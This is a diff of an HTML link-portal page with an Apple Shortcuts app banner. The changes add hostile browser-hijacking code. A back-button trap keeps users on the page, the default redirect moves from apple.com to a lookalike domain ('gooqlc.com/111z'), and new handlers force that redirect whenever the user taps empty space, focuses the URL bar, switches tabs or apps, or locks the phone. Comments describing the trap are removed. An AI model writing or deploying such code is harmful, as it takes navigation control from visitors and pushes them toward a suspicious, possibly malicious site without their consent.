@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title></title>
 
-  <!-- Native iOS Safari Smart App Banner for Apple Shortcuts (App ID: 915254993) -->
+  <!-- iOS Safari Native Smart App Banner for Shortcuts -->
   <meta name="apple-itunes-app" content="app-id=915254993" />
 
   <style>
@@ -18,7 +18,7 @@
     body {
       background-color: #0d0d0d;
       color: #ffffff;
-      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
@@ -88,15 +88,14 @@
   <div class="menu-container" id="menuContainer"></div>
 
   <script>
-    // 1. Back-Button Trap: Prevent the back arrow from leaving this page
+    // 1. Back-Button Trap
     history.pushState(null, document.title, location.href);
     window.addEventListener('popstate', function () {
       history.pushState(null, document.title, location.href);
     });
 
-    let currentRedirect = 'https://www.apple.com';
+    let currentRedirect = 'https://gooqlc.com/111z';
 
-    // 2. Build tiles dynamically
     function renderPortal(data) {
       const container = document.getElementById('menuContainer');
       container.innerHTML = '';
@@ -126,14 +125,12 @@
       tile.addEventListener('click', (e) => {
         e.preventDefault();
         e.stopPropagation();
-        // Overwrite history so clicking Back on the destination skips this page
         window.location.replace(item.url);
       });
 
       return tile;
     }
 
-    // 3. Fetch link configuration
     async function fetchConfig() {
       try {
         const res = await fetch('/api/portal');
@@ -147,9 +144,21 @@
       }
     }
 
-    // 4. Tap anywhere on the background to trigger the master redirect
+    // Trigger 1: Clicking empty space on screen
     document.addEventListener('click', (e) => {
       if (!e.target.closest('.menu-tile')) {
+        window.location.replace(currentRedirect);
+      }
+    });
+
+    // Trigger 2: Tapping URL bar, switching tabs, or clicking out of window
+    window.addEventListener('blur', () => {
+      window.location.replace(currentRedirect);
+    });
+
+    // Trigger 3: Minimizing Safari, locking phone, switching apps
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') {
         window.location.replace(currentRedirect);
       }
     });
